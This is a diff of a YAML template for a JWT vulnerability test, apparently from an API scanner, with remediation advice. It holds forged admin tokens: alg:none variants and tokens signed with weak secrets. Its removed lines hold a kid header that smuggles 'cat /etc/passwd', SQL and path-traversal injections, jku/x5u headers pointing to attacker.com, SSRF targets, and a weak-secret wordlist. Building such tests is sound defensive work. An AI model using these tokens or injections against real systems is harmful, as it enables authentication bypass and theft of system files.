@@ -4,156 +4,48 @@
 name: "JWT Attacks"
 category: "authentication"
 severity: "critical"
-description: "Tests for JWT vulnerabilities including algorithm confusion, weak secrets, header injection, and signature bypass techniques"
+description: "Tests for JWT vulnerabilities including alg:none bypass, weak secrets, header injection, and claim manipulation"
 
 # Fields commonly containing JWT tokens
 target_fields:
   - "Authorization"
+  - "Cookie"
   - "token"
   - "jwt"
   - "access_token"
   - "id_token"
   - "refresh_token"
   - "auth_token"
-  - "bearer"
-  - "session_token"
 
-# Attack payloads organized by category
+# Attack payloads - each is a plain string token
 payloads:
-  # Category 1: alg:none header bypass (strip signature, accept unsigned tokens)
-  - name: "alg_none_lowercase"
-    description: "JWT with alg:none to bypass signature verification"
-    value: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
-    
-  - name: "alg_none_uppercase"
-    description: "JWT with alg:NONE (uppercase variant)"
-    value: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
-    
-  - name: "alg_none_mixed_case"
-    description: "JWT with alg:nOnE (mixed case)"
-    value: "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
-    
-  - name: "alg_null"
-    description: "JWT with alg:null"
-    value: "eyJhbGciOm51bGwsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
+  # alg:none — unsigned token (strip signature entirely)
+  - "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDE5MTYyMzkwMjIsICJyb2xlIjogImFkbWluIn0."
   
-  # Category 2: Algorithm confusion (RS256 -> HS256)
-  - name: "rs256_to_hs256_confusion"
-    description: "Algorithm confusion attack - RS256 changed to HS256 using public key as HMAC secret"
-    value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.HMAC_SIGNED_WITH_PUBLIC_KEY"
-    attack_type: "algorithm_confusion"
-    
-  - name: "rs256_to_hs384_confusion"
-    description: "RS256 to HS384 algorithm confusion"
-    value: "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.HMAC_SIGNED_WITH_PUBLIC_KEY"
-    attack_type: "algorithm_confusion"
-    
-  - name: "rs256_to_hs512_confusion"
-    description: "RS256 to HS512 algorithm confusion"
-    value: "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.HMAC_SIGNED_WITH_PUBLIC_KEY"
-    attack_type: "algorithm_confusion"
+  # alg:NONE (uppercase bypass attempt)
+  - "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
   
-  # Category 3: Weak secret brute-force
-  - name: "weak_secret_password"
-    description: "JWT signed with common weak secret 'password'"
-    value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.8jnKGd2t_RgXCB3B3IbLbY8G3Zk7L-HvM_6P4xGXcO8"
-    attack_type: "weak_secret"
-    
-  - name: "weak_secret_secret"
-    description: "JWT signed with common weak secret 'secret'"
-    value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.YPV_3UOYthrdSk-LX3vN2BD6uV_Lt6fYCfPbAmJFLLE"
-    attack_type: "weak_secret"
-    
-  - name: "weak_secret_123456"
-    description: "JWT signed with common weak secret '123456'"
-    value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.g7brFh-5khiH-2QuA_LMdBZ0TCPwp8v_rh7YYCe9k1Q"
-    attack_type: "weak_secret"
-    
-  - name: "weak_secret_empty"
-    description: "JWT signed with empty secret"
-    value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.fNNi36S4VVyKXDmgiFgKxo3d2f3hJCGPkJL0cAexTfc"
-    attack_type: "weak_secret"
-    
-  - name: "weak_secret_jwt"
-    description: "JWT signed with common weak secret 'jwt'"
-    value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.n6UU7Y42jj9aKZC5OjL_LnOmvvnJ87T2xLJYGwLh8Bo"
-    attack_type: "weak_secret"
-    
-  # Category 4: kid (Key ID) header injection
-  - name: "kid_path_traversal"
-    description: "kid header path traversal to /dev/null"
-    value: "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SIGNED_WITH_EMPTY_KEY"
-    attack_type: "kid_injection"
-    
-  - name: "kid_sql_injection"
-    description: "kid header SQL injection attempt"
-    value: "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEyMycgT1IgJzEnPScxJy0tIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
-    attack_type: "kid_injection"
-    
-  - name: "kid_command_injection"
-    description: "kid header command injection"
-    value: "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTsgY2F0IC9ldGMvcGFzc3dkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
-    attack_type: "kid_injection"
-    
-  - name: "kid_null_byte"
-    description: "kid header null byte injection"
-    value: "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEyMyVwMCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
-    attack_type: "kid_injection"
+  # alg:nOnE (mixed case bypass attempt)
+  - "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
   
-  # Category 5: Token expiry manipulation (exp field tampering)
-  - name: "exp_far_future"
-    description: "JWT with expiry set to year 2099"
-    value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjo0MTAyNDQ0ODAwLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
-    attack_type: "expiry_manipulation"
-    
-  - name: "exp_removed"
-    description: "JWT with exp field removed"
-    value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwicm9sZSI6ImFkbWluIn0.SIGNATURE"
-    attack_type: "expiry_manipulation"
-    
-  - name: "exp_negative"
-    description: "JWT with negative exp value"
-    value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjotMSwicm9sZSI6ImFkbWluIn0.SIGNATURE"
-    attack_type: "expiry_manipulation"
+  # alg:null (null algorithm value)
+  - "eyJhbGciOm51bGwsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
   
-  # Category 6: JWT header injection (jku/x5u pointing to attacker-controlled JWKS endpoint)
-  - name: "jku_attacker_endpoint"
-    description: "jku header pointing to attacker-controlled endpoint"
-    value: "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vLndlbGwta25vd24vandrcy5qc29uIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.ATTACKER_SIGNED"
-    attack_type: "header_injection"
-    
-  - name: "x5u_attacker_endpoint"
-    description: "x5u header pointing to attacker-controlled certificate"
-    value: "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vY2VydC5wZW0iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.ATTACKER_SIGNED"
-    attack_type: "header_injection"
-    
-  - name: "jku_ssrf_localhost"
-    description: "jku header SSRF to localhost"
-    value: "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvandrcyIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
-    attack_type: "header_injection"
-    
-  - name: "jku_ssrf_internal"
-    description: "jku header SSRF to internal network"
-    value: "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xOTIuMTY4LjEuMS9hZG1pbi9qd2tzIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
-    attack_type: "header_injection"
-
-# Common weak secrets for brute force testing
-weak_secrets:
-  - "secret"
-  - "password"
-  - "123456"
-  - "12345678"
-  - "jwt"
-  - "secretkey"
-  - "your-256-bit-secret"
-  - "your-secret-key"
-  - "mysecret"
-  - "test"
-  - "admin"
-  - ""
-  - "key"
-  - "private"
-  - "changeme"
+  # Weak secret: 'password' — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.GG3HZGyPvxIaUXQUNM2l5ZU8C4hT3Twzjm57QCrA04Y"
+  
+  # Weak secret: 'secret' — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.F6nwNxLEFMQ1xa3P2-RY8eERp4DDHrlMMpUqNNx7gzs"
+  
+  # Weak secret: '123456' — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.-UmleTeJ1UGMZF27cd6XNgau7AnUhJyKN5K78j_akvM"
+  
+  # Weak secret: '' (empty string) — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.QIgQDAov0L6D7LvmD_vTk8iDuSH3BxaqkE9a9CijyOI"
+  
+  # Weak secret: 'jwt' — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.miFXQHX5yq4FHKNT7z43rBQN08A-MiShbrQwBQhvgfc"
+  
 
 # Indicators that suggest successful JWT attack
 success_indicators:
@@ -168,34 +60,9 @@ success_indicators:
     - "authorized"
   
   status_codes:
-    - 200
+    - 200  # Successful bypass - should have been 401/403
     - 201
     - 302
-  
-  headers_present:
-    - "Set-Cookie"
-    - "Authorization"
-  
-  absence_of:
-    - "invalid token"
-    - "token expired"
-    - "unauthorized"
-    - "forbidden"
-    - "401"
-    - "403"
-    - "invalid signature"
-    - "malformed token"
-
-# Detection patterns for vulnerable implementations
-vulnerability_patterns:
-  - "accepts tokens with alg:none"
-  - "no signature verification"
-  - "algorithm confusion possible"
-  - "weak HMAC secret"
-  - "missing expiry validation"
-  - "unsafe kid header processing"
-  - "unvalidated jku/x5u endpoints"
-  - "accepts expired tokens"
 
 # How to fix JWT vulnerabilities
 remediation: |
@@ -213,8 +80,8 @@ remediation: |
      # ✅ GOOD - Explicitly specify algorithm
      token = jwt.decode(token_string, public_key, algorithms=["RS256"])
      
-     # ❌ BAD - Allows any algorithm
-     token = jwt.decode(token_string, verify=False)
+     # ❌ BAD - Allows any algorithm or skips verification
+     token = jwt.decode(token_string, options={"verify_signature": False})
      ```
 
   2. **Strong Secrets**:
@@ -245,20 +112,7 @@ remediation: |
      const decoded = jwt.decode(token);
      ```
 
-  4. **Header Parameter Validation**:
-     - Validate 'kid' parameter against whitelist
-     - Reject 'jku' and 'x5u' or strictly validate against whitelist
-     - Sanitize all header parameters to prevent injection
-     
-     ```python
-     ALLOWED_KIDS = ['key1', 'key2', 'key3']
-     
-     header = jwt.get_unverified_header(token)
-     if header.get('kid') not in ALLOWED_KIDS:
-         raise ValueError("Invalid key ID")
-     ```
-
-  5. **Expiry Validation**:
+  4. **Expiry Validation**:
      - Always validate 'exp' claim
      - Reject tokens without 'exp' claim
      - Consider implementing 'nbf' (not before) claim
@@ -277,35 +131,14 @@ remediation: |
      )
      ```
 
-  6. **Additional Security Measures**:
-     - Implement token revocation/blacklisting
-     - Use short-lived access tokens with refresh tokens
-     - Add audience ('aud') and issuer ('iss') claims validation
-     - Implement rate limiting on authentication endpoints
-     - Monitor for suspicious token usage patterns
-     - Use 'jti' (JWT ID) claim for one-time tokens
-
-  7. **Algorithm Selection**:
+  5. **Algorithm Selection**:
      - Prefer RS256 (RSA) over HS256 (HMAC) for better key management
      - Use EdDSA (Ed25519) for modern implementations
-     - Avoid deprecated algorithms (HS384, RS384 with weak keys)
+     - HS256, HS384, HS512 are all valid HMAC algorithms when used correctly
 
 references:
   - "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
   - "https://cwe.mitre.org/data/definitions/347.html"
   - "https://portswigger.net/web-security/jwt"
   - "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
-  - "https://nvd.nist.gov/vuln/detail/CVE-2015-9235"
-  - "https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT.pdf"
-  - "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"
 
-cwe_mapping:
-  - "CWE-347: Improper Verification of Cryptographic Signature"
-  - "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
-  - "CWE-287: Improper Authentication"
-  - "CWE-295: Improper Certificate Validation"
-  - "CWE-798: Use of Hard-coded Credentials"
-
-owasp_api_mapping:
-  - "API2:2023 Broken Authentication"
-  - "API8:2023 Security Misconfiguration"
